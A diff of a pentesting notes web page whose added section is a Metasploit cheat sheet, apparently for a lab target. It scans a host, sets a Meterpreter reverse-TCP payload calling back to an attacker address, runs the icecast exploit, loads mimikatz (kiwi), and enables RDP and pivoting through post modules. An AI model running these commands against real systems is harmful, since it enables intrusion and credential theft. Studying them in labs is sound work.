@@ -2397,22 +2397,22 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#launch-msfconsole-in-kali" class="md-nav__link">
-    Launch msfconsole in Kali
+  <a href="#config" class="md-nav__link">
+    Config
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#postgresql-und-metasploit-beim-hochfahren-automatisch-starten" class="md-nav__link">
-    PostgreSQL und Metasploit beim Hochfahren automatisch starten
+  <a href="#start-msfconsole" class="md-nav__link">
+    Start msfconsole
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#dienste-manuell-starten" class="md-nav__link">
-    Dienste manuell starten
+  <a href="#use-exploit" class="md-nav__link">
+    Use Exploit
   </a>
   
 </li>
@@ -2421,6 +2421,90 @@
   
 </nav>
       
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../burpsuite/" class="md-nav__link">
+        Burpsuite
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../gobuster/" class="md-nav__link">
+        GoBuster
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hydra/" class="md-nav__link">
+        Hydra
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../john/" class="md-nav__link">
+        John
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linpeas/" class="md-nav__link">
+        Linpeas
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mimikatz/" class="md-nav__link">
+        mimikatz
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../netcat/" class="md-nav__link">
+        Netcat
+      </a>
     </li>
   
 
@@ -3260,22 +3344,22 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#launch-msfconsole-in-kali" class="md-nav__link">
-    Launch msfconsole in Kali
+  <a href="#config" class="md-nav__link">
+    Config
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#postgresql-und-metasploit-beim-hochfahren-automatisch-starten" class="md-nav__link">
-    PostgreSQL und Metasploit beim Hochfahren automatisch starten
+  <a href="#start-msfconsole" class="md-nav__link">
+    Start msfconsole
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#dienste-manuell-starten" class="md-nav__link">
-    Dienste manuell starten
+  <a href="#use-exploit" class="md-nav__link">
+    Use Exploit
   </a>
   
 </li>
@@ -3298,17 +3382,56 @@
                 
                 
                 <h1 id="metasploit">Metasploit</h1>
-<h2 id="launch-msfconsole-in-kali">Launch msfconsole in Kali</h2>
-<div class="highlight"><pre><span></span><code>Msfconsole
-db_status
-</code></pre></div>
-<h2 id="postgresql-und-metasploit-beim-hochfahren-automatisch-starten">PostgreSQL und Metasploit beim Hochfahren automatisch starten</h2>
+<h2 id="config">Config</h2>
+<p>Start PostgreSQL und Metasploit on boot</p>
 <div class="highlight"><pre><span></span><code>update-rc.d postgresql <span class="nb">enable</span>
 update-rc.d metasploit <span class="nb">enable</span>
 </code></pre></div>
-<h2 id="dienste-manuell-starten">Dienste manuell starten</h2>
+<p>Manuall start</p>
 <div class="highlight"><pre><span></span><code>service postgresql start
 service metasploit start
+</code></pre></div>
+<h2 id="start-msfconsole">Start msfconsole</h2>
+<p>Init Metaspoit and start the console</p>
+<div class="highlight"><pre><span></span><code>msfdb init
+msfconsole -h
+msfconsole
+db_status
+</code></pre></div>
+<p>Add Target</p>
+<div class="highlight"><pre><span></span><code>db_nmap -sV <span class="m">10</span>.10.201.217
+</code></pre></div>
+<p>Scan Target</p>
+<div class="highlight"><pre><span></span><code>hosts
+services
+vulns
+</code></pre></div>
+<h2 id="use-exploit">Use Exploit</h2>
+<p>This is an example using an exploit with Metasploit:</p>
+<div class="highlight"><pre><span></span><code>search multi/handler
+use <span class="c1"># exploit/multi/handler</span>
+<span class="nb">set</span> PAYLOAD windows/meterpreter/reverse_tcp
+<span class="nb">set</span> LHOST <span class="m">10</span>.9.193.173
+<span class="nb">set</span> RHOSTS <span class="m">10</span>.10.201.217
+use icecast
+run -j
+sessions
+sessions -i <span class="m">1</span>
+</code></pre></div>
+<p>Check Machine</p>
+<div class="highlight"><pre><span></span><code>getprivs
+sysinfo
+getuid
+</code></pre></div>
+<p>Start Mimikatz</p>
+<div class="highlight"><pre><span></span><code>load kiwi
+</code></pre></div>
+<p>Try different exploits</p>
+<div class="highlight"><pre><span></span><code>run post/windows/gather/checkvm
+run post/multi/recon/local_exploit_suggester
+run post/windows/manage/enable_rdp
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>run autoroute -s <span class="m">10</span>.10.201.217 -n <span class="m">255</span>.255.255.0
 </code></pre></div>
                 
               
@@ -3342,13 +3465,13 @@ service metasploit start
         </a>
       
       
-        <a href="../nmap/" class="md-footer__link md-footer__link--next" rel="next">
+        <a href="../burpsuite/" class="md-footer__link md-footer__link--next" rel="next">
           <div class="md-footer__title">
             <div class="md-ellipsis">
               <span class="md-footer__direction">
                 Next
               </span>
-              NMAP
+              Burpsuite
             </div>
           </div>
           <div class="md-footer__button md-icon">
